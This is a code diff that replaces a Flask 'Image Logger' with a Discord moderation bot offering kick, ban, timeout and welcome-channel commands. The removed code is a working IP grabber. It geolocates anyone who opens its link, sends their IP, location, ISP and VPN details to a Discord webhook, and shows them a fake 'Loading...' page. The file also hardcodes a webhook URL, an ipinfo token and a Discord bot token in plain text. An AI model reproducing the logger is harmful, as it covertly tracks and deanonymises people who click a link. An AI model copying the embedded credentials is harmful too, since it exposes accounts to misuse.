@@ -1,83 +1,105 @@
-from flask import Flask, request, Response
-import requests
-import json
+import discord
+from discord.ext import commands
+from datetime import datetime, timedelta
+import os
 
-app = Flask(__name__)
+intents = discord.Intents.default()
+intents.members = True  # Enable member-related events
 
-DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1334821132876120099/Cih_JEF2oZ-SAqEv-WhGrgHH1CwLxNuEvEYU8GzNzkjPmRYga39V-ranJY9Rti1neiRs'
-IPINFO_TOKEN = 'af34e1cc0c93a9'  # Your actual ipinfo.io token
+# Define the bot and its command prefix
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-def send_to_discord(info):
-    data = {
-        "embeds": [
-            {
-                "title": "Image Logger - IP Logged",
-                "description": "A User Opened the Original Image!",
-                "color": 3447003,  # Blue color
-                "fields": [
-                    {"name": "IP Info", "value": info}
-                ]
-            }
-        ]
-    }
-    headers = {"Content-Type": "application/json"}
-    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
+# List of role IDs allowed to use moderation commands
+ALLOWED_ROLES = [
+    1347339503379153057,
+    1347339566696366151,
+    1347339659398611041,
+    1347339699986890814
+]
 
-@app.route('/')
-def log_ip_info():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if ip == '127.0.0.1':
-        ip = requests.get('https://api.ipify.org').text  # Fallback to external service
+# Variable to store the welcome channel ID
+welcome_channel_id = None
 
-    response = requests.get(f'https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}')
-    data = response.json()
 
-    info = f"""
-    IP: {data.get('ip')}
-    Provider: {data.get('org')}
-    ASN: {data.get('asn', {}).get('asn')}
-    Country: {data.get('country')}
-    Region: {data.get('region')}
-    City: {data.get('city')}
-    Coords: {data.get('loc')} (Approximate)
-    Geolocation Accuracy: {data.get('geo', {}).get('accuracy')}
-    Timezone: {data.get('timezone')}
-    Postal: {data.get('postal')}
-    Carrier: {data.get('carrier')}
-    Mobile: {data.get('mobile')}
-    VPN: {data.get('privacy', {}).get('vpn')}
-    Proxy: {data.get('privacy', {}).get('proxy')}
-    Tor: {data.get('privacy', {}).get('tor')}
-    Hosting: {data.get('privacy', {}).get('hosting')}
-    Threat Level: {data.get('threat', {}).get('level')}
-    Threat Type: {data.get('threat', {}).get('type')}
-    ASN Name: {data.get('asn', {}).get('name')}
-    ASN Domain: {data.get('asn', {}).get('domain')}
-    ASN Route: {data.get('asn', {}).get('route')}
-    Company Name: {data.get('company', {}).get('name')}
-    Company Domain: {data.get('company', {}).get('domain')}
-    Reverse DNS: {data.get('rdns', 'N/A')}
-    Connection Type: {data.get('connection', {}).get('type', 'N/A')}
-    Connection Speed: {data.get('connection', {}).get('speed', 'N/A')}
-    Hostname: {data.get('hostname', 'N/A')}
-    City Geoname ID: {data.get('city_geoname_id', 'N/A')}
-    Metro Code: {data.get('metro', 'N/A')}
-    IP Range: {data.get('range', 'N/A')}
-    Autonomous System Organization: {data.get('asn_org', 'N/A')}
-    Continent Code: {data.get('continent_code', 'N/A')}
-    Average Income: {data.get('average_income', 'N/A')}
-    Population Density: {data.get('population_density', 'N/A')}
-    Climate: {data.get('climate', 'N/A')}
-    ISP: {data.get('isp', 'N/A')}
-    Domain: {data.get('domain', 'N/A')}
-    Usage Type: {data.get('usage_type', 'N/A')}
-    """
+# Helper function to check permissions
+def has_permission(interaction: discord.Interaction) -> bool:
+    user_roles = [role.id for role in interaction.user.roles]
+    return any(role_id in ALLOWED_ROLES for role_id in user_roles)
 
-    print(info)
-    send_to_discord(info)
 
-    # Infinite loading response
-    return Response("<html><head><title>Loading...</title></head><body><h1>Loading...</h1></body></html>", status=200, content_type='text/html')
+# Slash Commands
+@bot.tree.command(name="kick", description="Kick a member from the server")
+async def kick(interaction: discord.Interaction, member: discord.Member, reason: str = None):
+    if not has_permission(interaction):
+        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
+        return
 
-if __name__ == '__main__':
-    app.run(debug=True)
+    await member.kick(reason=reason)
+    await interaction.response.send_message(f"{member} has been kicked. Reason: {reason}")
+
+
+@bot.tree.command(name="ban", description="Ban a member from the server")
+async def ban(interaction: discord.Interaction, member: discord.Member, reason: str = None):
+    if not has_permission(interaction):
+        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
+        return
+
+    await member.ban(reason=reason)
+    await interaction.response.send_message(f"{member} has been banned. Reason: {reason}")
+
+
+@bot.tree.command(name="timeout", description="Timeout a member")
+async def timeout(interaction: discord.Interaction, member: discord.Member, duration: int):
+    if not has_permission(interaction):
+        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
+        return
+
+    # Apply timeout using datetime.utcnow()
+    await member.edit(timeout=datetime.utcnow() + timedelta(minutes=duration))
+    await interaction.response.send_message(f"{member} has been timed out for {duration} minutes.")
+
+
+@bot.tree.command(name="untimeout", description="Remove timeout from a member")
+async def untimeout(interaction: discord.Interaction, member: discord.Member):
+    if not has_permission(interaction):
+        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
+        return
+
+    await member.edit(timeout=None)
+    await interaction.response.send_message(f"{member} has been untimed out.")
+
+
+# Command to set the welcome channel
+@bot.tree.command(name="setwelcomechannel", description="Set the welcome message channel")
+async def set_welcome_channel(interaction: discord.Interaction, channel: discord.TextChannel):
+    global welcome_channel_id
+    if not has_permission(interaction):
+        await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
+        return
+
+    welcome_channel_id = channel.id
+    await interaction.response.send_message(f"Welcome messages will now be sent to {channel.mention}.")
+
+
+# Event: On Member Join
+@bot.event
+async def on_member_join(member):
+    global welcome_channel_id
+    if welcome_channel_id:
+        channel = member.guild.get_channel(welcome_channel_id)
+    else:
+        channel = member.guild.system_channel  # Fallback to system channel if not set
+
+    if channel:
+        welcome_message = f"Welcome to Sawaahh's Beaming, {member.mention}! Go to the sites to get started."
+        await channel.send(welcome_message)
+
+
+# Run the bot
+@bot.event
+async def on_ready():
+    await bot.tree.sync()  # Sync the slash commands
+    print(f"We have logged in as {bot.user}")
+
+# Replace with your actual bot token
+bot.run("MTM0OTczNjY1OTEwMDQ5OTk2OA.GS8I6a.5jKXOCphyYfBoWLHpSnGcmUH5R58GbfQ65kY3g")
